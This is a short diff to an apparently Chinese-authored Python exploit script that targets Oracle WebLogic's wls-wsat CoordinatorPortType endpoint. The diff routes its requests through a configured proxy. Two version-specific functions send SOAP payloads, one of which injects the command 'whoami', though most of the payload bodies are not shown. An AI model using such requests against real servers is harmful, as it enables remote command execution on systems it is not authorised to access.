@@ -3,6 +3,7 @@
 
 import requests
 
+from Config.config_proxies import proxies
 
 # 脚本信息
 ######################################################
@@ -36,7 +37,7 @@ def weblogic_10_3_6(ip):
      </soapenv:Header>
      <soapenv:Body></soapenv:Body></soapenv:Envelope>"""
     url = "%s/wls-wsat/CoordinatorPortType" % (ip)
-    rsp = requests.post(url, data=body, verify=False, headers=headers)
+    rsp = requests.post(url, data=body, verify=False, headers=headers,proxies=proxies)
     return rsp.status_code, rsp.text
 
 
@@ -101,7 +102,7 @@ def weblogic_12_1_3(ip):
     </soapenv:Header>
     <soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>''' % ("whoami")
     url = "%s/wls-wsat/CoordinatorPortType" % (ip)
-    rsp = requests.post(url, data=body, verify=False, headers=headers)
+    rsp = requests.post(url, data=body, verify=False, headers=headers,proxies=proxies)
     return rsp.status_code, rsp.text
 
 
